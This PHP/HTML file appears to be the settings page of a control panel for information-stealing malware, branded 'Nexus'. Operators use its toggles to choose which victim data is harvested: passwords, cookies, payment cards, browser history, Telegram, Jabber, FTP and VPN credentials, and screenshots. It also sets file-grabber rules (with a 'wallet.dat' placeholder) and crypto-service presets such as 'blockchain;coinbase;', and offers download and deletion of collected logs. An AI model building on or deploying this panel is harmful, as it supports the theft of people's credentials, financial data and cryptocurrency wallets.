<?php  
ini_set("max_execution_time", 900);
session_start();
include 'database.php';
require_once("auth.php");
$statusSettings    = $pdoConnection->query("SELECT * FROM `settings`")->fetch();
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>Nexus:Settings</title>
  <!-- plugins:css -->
      <script src="js/jquery.js"></script>
	  <script src="js/main.js"></script>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
    <link rel="stylesheet" href="css/switch.css">
  <!-- endinject -->
  <!-- plugin css for this page -->
  <!-- End plugin css for this page -->
  <!-- inject:css -->
      <link id="style" rel="stylesheet" href="css/<?php if($_COOKIE["nightmode"]=="true") echo "dark";?>style.css">
  <!-- endinject -->
  <link rel="shortcut icon" href="images/favicon.png" />
</head>

<body onload="settingsPage()">
  <div class="container-scroller">
   <?php include "partials/_navbar.php";?>
    <div class="container-fluid page-body-wrapper">
      <div class="main-panel">
        <div class="content-wrapper">
          <div class="row">
            <div class="col-12 grid-margin">
              <div class="card">
			  <h4 class="card-header">Settings</h4>
                <div class="card-body">
				
                  <div class="row d-block">
                    					<form id="settingsRow">

<div>
<div class = "collumn">
<div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="cis" <?php  if($statusSettings[1]=="on"){echo "checked";}?>>
Enable CIS
</label>
</div>
<div class="form-check row">
<label class="form-check-label">Duplicate
<input type="checkbox" name="repeat" <?php  if($statusSettings[2]=="on"){echo "checked";}?>>
</label>
</div>
<div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="telegram" <?php  if($statusSettings[3]=="on"){echo "checked";}?>>
Telegram
</label>
</div><div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="history" <?php  if($statusSettings[4]=="on"){echo "checked";}?>>
History
</label>
</div></div>
<div class = "collumn">
<div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="autocomplete" <?php  if($statusSettings[5]=="on"){echo "checked";}?>>
Autocomplete
</label>
</div><div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="cards" <?php  if($statusSettings[6]=="on"){echo "checked";}?>>
Cards
</label>
</div><div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="cookies" <?php  if($statusSettings[7]=="on"){echo "checked";}?>>
Cookies
</label>
</div><div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="passwords" <?php  if($statusSettings[8]=="on"){echo "checked";}?>>
Passwords
</label>
</div></div>
<div class = "collumn"><div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="jabber" <?php  if($statusSettings[9]=="on"){echo "checked";}?>>
Jabber
</label>
    </div>
	<div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="ftp" <?php  if($statusSettings[10]=="on"){echo "checked";}?>>
FTP
</label>
    </div>
	<div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="screenshot" <?php  if($statusSettings[11]=="on"){echo "checked";}?>>
Screenshot
</label>
    </div>
</div>
	<div class = "collumn">
	<div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="vpn" <?php  if($statusSettings[13]=="on"){echo "checked";}?>>
VPN
</label>
    </div>
	<div class="form-check row">

<label class="form-check-label">
<input type="checkbox" name="grabber" <?php  if($statusSettings[14]=="on"){echo "checked";}?>>
Grabber
</label>
    </div>
</div>
	<div class="buttonsBlock">
	<br>
	<center>
	<div class="btn-group">
<button type="button" class="btn btn-success dropdown-toggle btn-sm" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Download
</button>
<div class="dropdown-menu">
<a class="dropdown-item" href="#!" onclick="downloadFile('all')" >Download all</a>
<a class="dropdown-item" href="#!" onclick="downloadFile('unchecked')">Download unchecked</a>
</div>
</div>
<div class="btn-group">
<button type="button" class="btn btn-danger dropdown-toggle btn-sm" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Delete
</button>
<div class="dropdown-menu">
<a class="dropdown-item" href="#!" onclick="deleteTable('all')" >Delete all</a>
<a class="dropdown-item" href="#!" onclick="deleteTable('checked')" >Delete checked</a>
<a class="dropdown-item" href="#!" onclick="deleteTable('empty')" >Delete empty</a>
</div>
</div><br><br><button type="button" onclick="submitSettings()"  name="acceptChanges" class="btn btn-primary">Accept changes</button></center></div></div></div>
</form>
                  </div>
                </div>
              </div>
			  
			
		<div class="col-12 grid-margin"  id="grabberHide" style="display:none">
				<div class="card">
				<button onclick="showSettings()" class="btn btn-primary" style="position: absolute;right: 1.5rem;top: .5rem;">Add rule <i class="fa fa-plus"></i></button>
				<div id="addRule" class="card-body" style="display:none;">
					<h4 class="header-title">Create rule</h4>
								<form class="form-horizontal" action="" method="POST">	
								<input type="hidden" name="editGrabber" value="">
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Name</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="Txt files" value="" name="name" type="text">
                                        </div>
                                    </div>								
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Folder</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="%ALL-FOLDERS%" value="" name="folder" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Files</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="*.txt" value="" name="pattern" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Exception</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="wallet.dat" value="" name="exception" type="text">
                                        </div>
                                    </div>
									
									<button type="button" onclick="submitGrabber()" name="addRule" class="btn btn-primary">Create</button>
    
                                </form>
								</div>
				<div class="card-body p-4">
						<h4 class="header-title">Grabber rules</h4>
							<div class="table-responsive mt-3" style="overflow-x: inherit;">
								<table id="grabberTable" class="table table-hover table-centered mb-0">
									<thead>
										<tr>
											<th>Name</th>
											<th>Folder</th>
											<th>Files</th>
											<th>Exception</th>
											<th>Action</th>
										</tr>
									</thead>
									
									<tbody>
									</tbody>
                            </table>
                        </div>
                    </div>
					</div>
					</div>		
								<div class="col-12">
				<div class="card">
				<button onclick="showPresets()" class="btn btn-primary" style="position: absolute;right: 1.5rem;top: .5rem;">Add preset <i class="fa fa-plus"></i></button>
				<div id="addPreset" class="card-body" style="display:none">
					<h4 class="header-title">Create preset</h4>
								<form id="presets" class="form-horizontal" action="" method="POST">	
								<input type="hidden" name="editPreset" value="">
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Name</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="Crypto" value="" name="name" type="text">
                                        </div>
                                    </div>								
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Services</label>
                                        <div class="col-sm-10">
										<textarea name="services" placeholder="blockchain;coinbase;" class="form-control" rows="10"></textarea>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Color</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="color">
                                                <option style="background-color: green;" value="green">Green</option>
                                                <option style="background-color: teal;" value="teal">Teal</option>
												<option style="background-color: steelblue;" value="steelblue">Blue</option>
												<option style="background-color: navy;" value="navy">Navy</option>
												<option style="background-color: firebrick;" value="firebrick">Red</option>
												<option style="background-color: coral;" value="coral">Coral</option>
												<option style="background-color: orangered;" value="orangered">Orange</option>
												<option style="background-color: gold;" value="gold">Gold</option>
												<option style="background-color: violet;" value="violet">Violet</option>
												<option style="background-color: indigo;" value="indigo">Indigo</option>
												<option style="background-color: black;" value="black">Black</option>
                                            </select>
                                        </div>
                                    </div>
									
									<button type="button" onclick="submitPreset()" class="btn btn-primary">Create</button>
    
                                </form>
								</div>
					<div class="card-body p-4">
						<h4 class="header-title">Presets</h4>
							<div class="table mt-3" style="overflow-x: inherit;">
								<table id="presetTable" class="table table-hover table-centered mb-0">
									<thead>
										<tr>
											<th>Name</th>
											<th>Services</th>
											<th>Color</th>
											<th>Action</th>
										</tr>
									</thead>
									
									<tbody></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
			
            </div>
          </div>
		   </div>
        </div>
        <!-- content-wrapper ends -->
        <!-- partial:partials/_footer.html -->
        <!-- partial -->
      </div>
      <!-- main-panel ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->

  <!-- plugins:js -->

  <!-- endinject -->
  <!-- Plugin js for this page-->
  <!-- End plugin js for this page-->
  <!-- inject:js -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
      integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut"
      crossorigin="anonymous"></script>
	     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
      integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k"
      crossorigin="anonymous"></script>
  <!-- endinject -->
  <!-- Custom js for this page-->
  <!-- End custom js for this page-->
</body>

</html>
